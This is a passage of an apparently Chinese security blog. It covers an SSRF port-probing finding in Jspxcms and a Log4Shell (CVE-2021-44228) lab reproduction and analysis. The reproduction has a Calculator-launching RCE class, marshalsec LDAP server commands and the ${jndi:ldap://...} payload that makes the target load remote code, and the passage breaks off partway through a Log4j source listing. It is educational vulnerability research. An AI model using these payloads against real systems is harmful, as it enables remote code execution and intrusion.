class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">protected <span class="keyword">void</span> <span class="title function_">ueditorCatchImage</span>(<span class="title class_">Site</span> site, <span class="title class_">HttpServletRequest</span> request,</span><br><span class="line">                                 <span class="title class_">HttpServletResponse</span> response) throws <span class="title class_">IOException</span> &#123;</span><br><span class="line">    <span class="title class_">GlobalUpload</span> gu = site.<span class="title function_">getGlobal</span>().<span class="title function_">getUpload</span>();</span><br><span class="line">    <span class="title class_">PublishPoint</span> point = site.<span class="title function_">getUploadsPublishPoint</span>();</span><br><span class="line">    <span class="title class_">FileHandler</span> fileHandler = point.<span class="title function_">getFileHandler</span>(pathResolver);</span><br><span class="line">    <span class="title class_">String</span> urlPrefix = point.<span class="title function_">getUrlPrefix</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title class_">StringBuilder</span> result = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&#123;\&quot;state\&quot;: \&quot;SUCCESS\&quot;, list: [&quot;</span>);</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">String</span>&gt; urls = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;<span class="title class_">String</span>&gt;();</span><br><span class="line">    <span class="title class_">List</span>&lt;<span class="title class_">String</span>&gt; srcs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;<span class="title class_">String</span>&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="title class_">String</span>[] source = request.<span class="title function_">getParameterValues</span>(<span class="string">&quot;source[]&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (source == <span class="literal">null</span>) &#123;</span><br><span class="line">        source = <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; source.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="title class_">String</span> src = source[i];</span><br><span class="line">        <span class="title class_">String</span> extension = <span class="title class_">FilenameUtils</span>.<span class="title function_">getExtension</span>(src);</span><br><span class="line">        <span class="comment">// 格式验证</span></span><br><span class="line">        <span class="keyword">if</span> (!gu.<span class="title function_">isExtensionValid</span>(extension, <span class="title class_">Uploader</span>.<span class="property">IMAGE</span>)) &#123;</span><br><span class="line">            <span class="comment">// state = &quot;Extension Invalid&quot;;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">HttpURLConnection</span>.<span class="title function_">setFollowRedirects</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="title class_">HttpURLConnection</span> conn = (<span class="title class_">HttpURLConnection</span>) <span class="keyword">new</span> <span class="title function_">URL</span>(src).<span class="title function_">openConnection</span>();</span><br><span class="line">        <span class="keyword">if</span> (conn.<span class="title function_">getContentType</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;image&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// state = &quot;ContentType Invalid&quot;;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (conn.<span class="title function_">getResponseCode</span>() != <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// state = &quot;Request Error&quot;;</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">String</span> pathname = site.<span class="title function_">getSiteBase</span>(<span class="title class_">Uploader</span>.<span class="title function_">getQuickPathname</span>(<span class="title class_">Uploader</span>.<span class="property">IMAGE</span>, extension));</span><br><span class="line">        <span class="title class_">InputStream</span> is = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            is = conn.<span class="title function_">getInputStream</span>();</span><br><span class="line">            fileHandler.<span class="title function_">storeFile</span>(is, pathname);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="title class_">IOUtils</span>.<span class="title function_">closeQuietly</span>(is);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">String</span> url = urlPrefix + pathname;</span><br><span class="line">        urls.<span class="title function_">add</span>(url);</span><br><span class="line">        srcs.<span class="title function_">add</span>(src);</span><br><span class="line">        result.<span class="title function_">append</span>(<span class="string">&quot;&#123;\&quot;state\&quot;: \&quot;SUCCESS\&quot;,&quot;</span>);</span><br><span class="line">        result.<span class="title function_">append</span>(<span class="string">&quot;\&quot;url\&quot;:\&quot;&quot;</span>).<span class="title function_">append</span>(url).<span class="title function_">append</span>(<span class="string">&quot;\&quot;,&quot;</span>);</span><br><span class="line">        result.<span class="title function_">append</span>(<span class="string">&quot;\&quot;source\&quot;:\&quot;&quot;</span>).<span class="title function_">append</span>(src).<span class="title function_">append</span>(<span class="string">&quot;\&quot;&#125;,&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.<span class="title function_">charAt</span>(result.<span class="title function_">length</span>() - <span class="number">1</span>) == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">        result.<span class="title function_">setLength</span>(result.<span class="title function_">length</span>() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result.<span class="title function_">append</span>(<span class="string">&quot;]&#125;&quot;</span>);</span><br><span class="line">    logger.<span class="title function_">debug</span>(result.<span class="title function_">toString</span>());</span><br><span class="line">    response.<span class="title function_">getWriter</span>().<span class="title function_">print</span>(result.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看该方法的使用情况，发现存在两处调用，选择一个前台不用被鉴权的方法进行查看。</p><p><img src="/img/post/jspxcms-code-audit-learn/25.png"></p><p>通过判断逻辑构造请求，可以发现当端口未开放时则返回500，当端口开放时则返回SUCCESS。</p><p><img src="/img/post/jspxcms-code-audit-learn/26.png"></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> code-audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-44228 Log4j2 JNDI注入漏洞</title>
      <link href="/cve-2021-44228-log4j2-jndi-attack.html"/>
      <url>/cve-2021-44228-log4j2-jndi-attack.html</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache Log4j2是一个通用的工业级Java日志框架，常用于Java应用中，如Web应用、分布式系统、微服务架构等，它能够帮助开发人员记录并追踪系统中的异常、性能问题和业务逻辑。</p><p>2021年12月9日，存在于Log4j2 JNDI功能中的一个远程代码执行漏洞利用细节被公开，随即对全球范围内使用Log4j2的应用和系统产生了重大影响。</p><p>该漏洞的根本原因是源于Log4j2的日志消息解析机制存在缺陷，当日志消息中包含特定格式的字符串时，Log4j2会尝试通过JNDI去解析和加载远程资源，而攻击者可以利用这一点发送恶意的日志消息，指向恶意的LDAP服务器，从而实现远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.0-beta9 ≤ Log4j2 ≤ 2.14.1</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>在一个SpringBoot项目中的pom.xml文件中添加如下2.14.1版本的Log4j2 Maven依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后编写如下SpringBoot应用，该应用会对用户的User-Agent以及登录的数据进行日志记录。在IDEA中启动该Web应用，这样，一个简单的漏洞复现环境就准备好了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.log4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestHeader;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4ShellApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger(Log4ShellApplication.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Log4ShellApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logUA</span><span class="params">(<span class="meta">@RequestHeader(&quot;User-Agent&quot;)</span> String ua)</span> &#123;</span><br><span class="line">        LOGGER.error(ua);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logLogin</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        LOGGER.error(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">    __                __ __ _____ __         __________</span><br><span class="line">   / /   ____  ____ _/ // // ___// /_  ___  / / / ____/___ _   __</span><br><span class="line">  / /   / __ \/ __ `/ // /_\__ \/ __ \/ _ \/ / / __/ / __ \ | / /</span><br><span class="line"> / /___/ /_/ / /_/ /__  __/__/ / / / /  __/ / / /___/ / / / |/ /</span><br><span class="line">/_____/\____/\__, /  /_/ /____/_/ /_/\___/_/_/_____/_/ /_/|___/</span><br><span class="line">            /____/</span><br><span class="line">2022-01-05 23:12:33 INFO  Log4ShellApplication:55 - Starting Log4ShellApplication v1.0.0 using Java 1.8.0_181 on m with PID 81127 (/Users/r00t/GitHub/CVE-2021-44228/Log4ShellEnv.jar started by r00t in /Users/r00t/GitHub/CVE-2021-44228)</span><br><span class="line">2022-01-05 23:12:33 INFO  Log4ShellApplication:663 - No active profile set, falling back to default profiles: default</span><br><span class="line">2022-01-05 23:12:34 INFO  TomcatWebServer:108 - Tomcat initialized with port(s): 44228 (http)</span><br><span class="line">Jan 05, 2022 11:12:34 PM org.apache.coyote.AbstractProtocol init</span><br><span class="line">INFO: Initializing ProtocolHandler [&quot;http-nio-44228&quot;]</span><br><span class="line">Jan 05, 2022 11:12:34 PM org.apache.catalina.core.StandardService startInternal</span><br><span class="line">INFO: Starting service [Tomcat]</span><br><span class="line">Jan 05, 2022 11:12:34 PM org.apache.catalina.core.StandardEngine startInternal</span><br><span class="line">INFO: Starting Servlet engine: [Apache Tomcat/9.0.46]</span><br><span class="line">Jan 05, 2022 11:12:35 PM org.apache.catalina.core.ApplicationContext log</span><br><span class="line">INFO: Initializing Spring embedded WebApplicationContext</span><br><span class="line">2022-01-05 23:12:35 INFO  ServletWebServerApplicationContext:290 - Root WebApplicationContext: initialization completed in 1472 ms</span><br><span class="line">Jan 05, 2022 11:12:35 PM org.apache.coyote.AbstractProtocol start</span><br><span class="line">INFO: Starting ProtocolHandler [&quot;http-nio-44228&quot;]</span><br><span class="line">2022-01-05 23:12:36 INFO  TomcatWebServer:220 - Tomcat started on port(s): 44228 (http) with context path &#x27;&#x27;</span><br><span class="line">2022-01-05 23:12:36 INFO  Log4ShellApplication:61 - Started Log4ShellApplication in 3.394 seconds (JVM running for 4.839)</span><br><span class="line">2022-01-05 23:12:36 INFO  ApplicationAvailabilityBean:75 - Application availability state LivenessState changed to CORRECT</span><br><span class="line">2022-01-05 23:12:36 INFO  ApplicationAvailabilityBean:75 - Application availability state ReadinessState changed to ACCEPTING_TRAFFIC</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>发送如下两个HTTP请求。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:44228</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>U=$&#123;sys:user.name&#125;; os=$&#123;sys:os.name&#125;; jv=$&#123;java:version&#125;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:44228</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>20</span><br><span class="line"></span><br><span class="line"><span class="language-haskell"><span class="class"><span class="keyword">data</span>=$&#123;<span class="title">java</span>:<span class="title">version</span>&#125;</span></span></span><br></pre></td></tr></table></figure><p>回到IDEA控制台便可以看到如下日志输出，其中包含了系统用户名、操作系统名、Java版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2022-01-05 23:12:18.124 ERROR 18704 --- [io-44228-exec-2] c.j.l.Log4ShellApplication               : U=r00t; os=Mac OS X; jv=Java version 1.8.0_181</span><br><span class="line">2022-01-05 23:13:05.890 ERROR 18704 --- [io-44228-exec-4] c.j.l.Log4ShellApplication               : Java version 1.8.0_181</span><br></pre></td></tr></table></figure><p>根据如上日志，可以发现Log4j2对带有${}的日志消息进行了特定格式的解析。</p><p>进一步的，我们可以通过JNDI注入来深入利用该漏洞。</p><p>准备如下RCE类，将其编译成class文件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCE</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;Calculator.app&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对外开放此文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 4444</span><br><span class="line">Serving HTTP on :: port 4444 (http://[::]:4444/) ...</span><br></pre></td></tr></table></figure><p>并使用marshalsec（<a href="https://github.com/mbechler/marshalsec%EF%BC%89%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8F%E7%9A%84LDAP%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">https://github.com/mbechler/marshalsec）开启一个恶意的LDAP服务器。</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://192.168.1.100:4444/#RCE&quot;</span></span><br><span class="line">Listening on 0.0.0.0:1389</span><br></pre></td></tr></table></figure><p>最后利用如下Payload实施JNDI注入攻击，最终会弹出一个计算器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /login TTP/1.1</span><br><span class="line">Host: 127.0.0.1:44228</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 42</span><br><span class="line"></span><br><span class="line">data=<span class="variable">$&#123;jndi:ldap://192.168.1.100:1389/RCE&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/0.png"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>将如上漏洞环境简化至如下几行代码，如下便是漏洞触发的关键代码片段。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.log4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4Shell</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LogManager.getLogger(Log4Shell.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">log</span> <span class="operator">=</span> <span class="string">&quot;$&#123;sys:user.name&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 默认配置下成功利用</span></span><br><span class="line">        <span class="comment">//LOGGER.fatal(log);</span></span><br><span class="line">        LOGGER.error(log);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 默认配置下利用无效</span></span><br><span class="line">        <span class="comment">//LOGGER.info(log);</span></span><br><span class="line">        <span class="comment">//LOGGER.warn(log);</span></span><br><span class="line">        <span class="comment">//LOGGER.debug(log);</span></span><br><span class="line">        <span class="comment">//LOGGER.trace(log);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先从Log4j日志管理器中获取一个与Log4Shell类相关联的日志记录器，并将其赋值给一个名为LOGGER的变量。其中Logger接口代表一个日志记录器，用于记录日志信息，它提供了多种方法来记录不同级别的日志信息（如debug、info、warn、error等）。这样，就可以在Log4Shell类中使用LOGGER对象来记录日志信息，例如随后执行的LOGGER.error()方法。</p><h3 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a>漏洞触发点</h3><p>那么我们便可以将断点断在LOGGER.error(log)代码行，从此处开始跟进分析。</p><p>由于Logger接口中的error(java.lang.String)方法在org.apache.logging.log4j.spi.AbstractLogger类中存在一个重写方法，所以起初会进入到了org.apache.logging.log4j.spi.AbstractLogger#error(java.lang.String)方法中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">error</span><span class="params">(<span class="keyword">final</span> String message)</span> &#123;</span><br><span class="line">    logIfEnabled(FQCN, Level.ERROR, <span class="literal">null</span>, message, (Throwable) <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/post/cve-2021-44228-log4j2-jndi-attack/1.png"></p><p>FQCN由<code>AbstractLogger.class.getName()</code>方法而来，即org.apache.logging.log4j.spi.AbstractLogger。</p><p>依据org.apache.logging.log4j.Level类中的静态代码块可知，Level.ERROR会是<code>new Level(&quot;ERROR&quot;, StandardLevel.ERROR.intLevel())</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.logging.log4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Locale;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.spi.StandardLevel;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.util.Strings;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Levels used for identifying the severity of an event. Levels are organized from most specific to least:</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #OFF&#125; (most specific, no logging)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #FATAL&#125; (most specific, little data)&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #ERROR&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> #WARN&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;li&gt;&#123;<span class="doctag">@link</span> 